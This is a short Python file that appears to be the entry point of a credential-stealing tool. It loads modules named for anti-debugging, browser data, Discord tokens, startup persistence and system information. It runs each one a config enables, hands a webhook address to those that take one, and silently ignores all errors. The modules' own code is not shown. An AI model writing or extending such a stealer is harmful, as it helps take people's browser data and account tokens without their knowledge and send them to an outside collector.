from antidebug import AntiDebug
from browsers import Browsers
from discordtoken import DiscordToken
from startup import Startup
from systeminfo import SystemInfo
from config import __CONFIG__


def setup_serial():
    funcs = [
        AntiDebug,
        Browsers,
        DiscordToken,
        Startup,
        SystemInfo,
    ]

    for func in funcs:
        if __CONFIG__[func.__name__.lower()]:
            try:
                if func.__init__.__code__.co_argcount == 2:
                    func(__CONFIG__["webhook"])
                else:
                    func()

            except Exception as e:
                pass
